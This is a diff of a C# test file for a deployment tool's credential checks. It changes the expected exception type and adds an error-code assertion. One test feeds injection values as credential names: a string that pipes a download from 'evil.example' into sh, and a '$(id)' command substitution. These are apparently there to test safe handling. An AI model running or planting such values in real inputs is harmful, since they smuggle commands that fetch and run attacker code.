@@ -157,7 +157,7 @@ public class CredentialStoringTests
         string file = MissingDeliveryCredential.Replace("@ENV@", "")
             .Replace("\"partner-key\"", "\"x;curl -s https://evil.example/p|sh;#\"");
 
-        QueueyConfigurationException ex = await ApplyFails(DeploymentFile.Parse(file),
+        QueueyException ex = await ApplyFails(DeploymentFile.Parse(file),
             new { publicId = "cred_1", name = "orders-key", type = "ApiKeyHeader" },
             new { publicId = "cred_2", name = "$(id)", type = "ApiKeyHeader" });
 
@@ -219,7 +219,7 @@ public class CredentialStoringTests
     {
         string file = MissingDeliveryCredential.Replace("@ENV@", environment is null ? "" : $"\"environment\": \"{environment}\",");
 
-        QueueyConfigurationException ex = await ApplyFails(DeploymentFile.Parse(file));
+        QueueyException ex = await ApplyFails(DeploymentFile.Parse(file));
 
         Assert.Contains("No credential named 'partner-key' in workspace ten_abc (workspace.delivery.credentialRef). Nothing was " +
                         "changed. Store it first. " + how, ex.Message);
@@ -240,7 +240,7 @@ public class CredentialStoringTests
     [Fact]
     public async Task Without_a_profile_the_commands_name_the_workspace_the_file_was_applied_to()
     {
-        QueueyConfigurationException ex = await ApplyFails(DeploymentFile.Parse(MissingDeliveryCredentialWithoutProfiles));
+        QueueyException ex = await ApplyFails(DeploymentFile.Parse(MissingDeliveryCredentialWithoutProfiles));
 
         Assert.Contains("queuey credentials request partner-key --type ApiKeyHeader --tenant ten_abc prints a link", ex.Message);
         Assert.Contains("queuey credentials list --tenant ten_abc --json", ex.Message);
@@ -263,7 +263,7 @@ public class CredentialStoringTests
     {
         string file = MissingDeliveryCredential.Replace("@ENV@", "\"environment\": \"${QUEUEY_WORKSPACE_ENVIRONMENT}\",");
 
-        QueueyConfigurationException ex = await ApplyFails(DeploymentFile.Parse(file).ForProfile("prod", _ => null));
+        QueueyException ex = await ApplyFails(DeploymentFile.Parse(file).ForProfile("prod", _ => null));
 
         Assert.Contains("queuey credentials request partner-key --type ApiKeyHeader --profile prod prints a link", ex.Message);
         Assert.Contains("queuey credentials list --profile prod --json", ex.Message);
@@ -272,7 +272,7 @@ public class CredentialStoringTests
     }
 
     /// <summary>Apply against a workspace with <paramref name="stored"/> as its credentials: it fails before its first write, with what to do.</summary>
-    private static async Task<QueueyConfigurationException> ApplyFails(DeploymentFile file, params object[] stored)
+    private static async Task<QueueyException> ApplyFails(DeploymentFile file, params object[] stored)
     {
         var api = new StubHttpMessageHandler(req =>
             StubHttpMessageHandler.DeployDefaults(req)
@@ -281,7 +281,8 @@ public class CredentialStoringTests
                 : throw new InvalidOperationException("unexpected " + req.Method + " " + req.RequestUri!.AbsolutePath)));
 
         QueueyService service = WaasTestHost.Build(apiStub: api);
-        var ex = await Assert.ThrowsAsync<QueueyConfigurationException>(() => service.ApplyDeploymentAsync(file));
+        var ex = await Assert.ThrowsAsync<QueueyException>(() => service.ApplyDeploymentAsync(file));
+        Assert.Equal("credential_not_found", ex.ErrorCode);
         Assert.All(api.Requests, r => Assert.Equal(HttpMethod.Get, r.Method));
         return ex;
     }
